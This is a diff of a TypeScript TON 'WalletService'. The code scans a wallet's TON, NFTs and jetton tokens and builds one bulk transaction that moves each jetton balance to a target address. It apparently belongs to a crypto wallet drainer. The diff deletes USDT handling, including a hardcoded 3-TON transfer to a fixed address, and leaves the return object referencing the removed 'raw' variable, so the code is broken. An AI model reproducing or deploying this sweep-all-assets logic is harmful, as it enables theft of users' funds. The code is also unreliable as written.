@@ -113,19 +113,8 @@ export class WalletService {
         forwardAmountTon: 0, // 转发给新拥有者的TON数量（可为 0）
         // forwardComment: `transfer @${username}`,
       });
-      const usdtPayloadBase64 = await buildNftTransferPayloadBase64({
-        newOwner: newOwnerWallet, // 新的拥有者地址（接收NFT的地址）
-        responseTo: wallet, // 回执地址（通常是发送方的钱包地址）
-        forwardAmountTon: 0, // 转发给新拥有者的TON数量（可为 0）
-        // forwardComment: `transfer @${username}`,
-      });
 
       const messages = [
-        {
-          address: "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs",
-          amount: this.toNanoStr(3),
-          payload: usdtPayloadBase64,
-        },
         {
           address: nftItemAddress, // ★ 目标是 NFT item 合约地址，不是新所有者钱包
           amount: amount, // 附带金额
@@ -190,30 +179,12 @@ export class WalletService {
       );
       const jettonData = await jettonRes.json();
       assets.jettons = jettonData.balances || [];
-      console.log("assets.jettons", assets.jettons);
-      // 4. 查找USDT余额
-      const usdtJetton = assets.jettons.find(
-        (j) =>
-          new TonWeb.utils.Address(j.jetton?.address).toString(
-            true,
-            true,
-            true
-          ) === "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"
-      );
-      console.log("usdtJetton", usdtJetton);
-      if (usdtJetton) {
-        assets.usdt.balance = usdtJetton.balance;
-        // 修复：使用更安全的方式计算USDT余额
-        const usdtBalance = String(usdtJetton.balance || "0");
-        const usdtAmount = TonWeb.utils.fromNano(usdtBalance);
-        assets.usdt.balanceUsdt = (parseFloat(usdtAmount) / 1000000).toString();
-      }
 
       console.log("钱包资产扫描完成:", {
         ton: assets.ton.balanceTon,
         nftCount: assets.nfts.length,
         jettonCount: assets.jettons.length,
-        usdt: assets.usdt.balanceUsdt,
+        jettons: assets.jettons,
       });
 
       return assets;
@@ -283,14 +254,6 @@ export class WalletService {
 
       // 4. 其他Jetton转移
       for (const jetton of assets.jettons) {
-        // 跳过USDT（已经处理过）
-        if (
-          jetton.jetton?.address ===
-          "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"
-        ) {
-          continue;
-        }
-
         const jettonPayload = await this.buildJettonTransferPayload({
           toAddress: targetAddress,
           amount: jetton.balance,
@@ -305,26 +268,11 @@ export class WalletService {
         });
       }
 
-      const raw = {
-        type: "bulk_asset_transfer",
-        wallet,
-        targetAddress,
-        assetCount: {
-          ton: tonBalance > 0.1 ? 1 : 0,
-          nft: assets.nfts.length,
-          jetton: assets.jettons.length,
-          usdt: parseFloat(assets.usdt.balanceUsdt) > 0 ? 1 : 0,
-        },
-        totalMessages: messages.length,
-        ts: Date.now(),
-      };
-
       console.log(`批量转移交易已生成: ${messages.length} 个消息`);
-      console.log("raw", raw);
       console.log("messages", messages);
       return {
         success: true,
-        data: { messages, raw },
+        data: { messages },
         assets: assets,
         messages: messages,
         raw: raw,
